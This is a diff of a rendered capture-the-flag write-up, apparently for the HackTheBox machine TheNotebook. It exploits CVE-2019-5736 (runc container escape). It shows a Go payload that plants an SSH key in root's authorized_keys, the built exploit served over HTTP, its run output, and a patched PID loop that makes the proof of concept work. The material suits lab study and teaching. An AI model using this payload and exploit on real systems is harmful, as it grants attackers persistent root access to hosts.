@@ -296,7 +296,7 @@ Resolving deltas: 100% <span class="o">(</span>10/10<span class="o">)</span>, <s
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n mkdir -p /root/.ssh/ &amp;&amp; echo &#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39; &gt; /root/.ssh/authorized_keys&#34;</span>
 </code></pre></div><p>I will compile the PoC and host it.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «CVE-2019-5736-PoC» «10.10.14.17» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
-$ go build -o exploit_runc main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
+$ go build -o breakout main.go <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">8080</span>
 Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
 </code></pre></div><p>On TheNotebook, I will have two SSH sessions. On the first SSH session, I will use it to download and execute the exploit within the container.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
@@ -305,28 +305,28 @@ root@0f4c2517af40:/opt/webapp# ./breakout
 <span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
 </code></pre></div><p>Then on the second session, I will run the sudo command.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
-</code></pre></div><p>But then, I get the following results</p>
+</code></pre></div><p>But then, on the container session, I get the following results:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@0f4c2517af40:/opt/webapp# ./breakout
 <span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
 <span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
 <span class="o">[</span>+<span class="o">]</span> Found the PID: self
 strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
-</code></pre></div><p>To resolve that, at line 42, I modified the following line to ignore anything that contains &ldquo;self&rdquo;. I will recompile the exploit and get it back to the container.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go">		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
-			<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
-			<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
-			<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
-				<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span>
-					<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
-					<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
-					<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-						<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-						<span class="k">return</span>
-					<span class="p">}</span>
-				<span class="p">}</span>
+</code></pre></div><p>To resolve that, at line 42, I modified the &ldquo;pid&rdquo; loop to ignore anything that contains &ldquo;self&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
+	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
+	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
+	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
+</span><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+				<span class="k">return</span>
 			<span class="p">}</span>
-		<span class="p">}</span>
-</code></pre></div><p>This time, it works</p>
+		<span class="p">}</span> <span class="c1">// end
+</span><span class="c1"></span>	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>I will recompile the exploit and get it back to the container, and this time it works!</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@c8cf4072ca26:/opt/webapp# ./breakout 
 <span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
 <span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
@@ -334,7 +334,7 @@ strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
 <span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
 <span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
 root@c8cf4072ca26:/opt/webapp# 
-</code></pre></div><p>For the full step, see the image below.</p>
+</code></pre></div><p>For the full steps, see the image below.</p>
 <p><img class="img-container" src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  />
 </p>
 <h4 id="ssh---root">SSH - Root</h4>
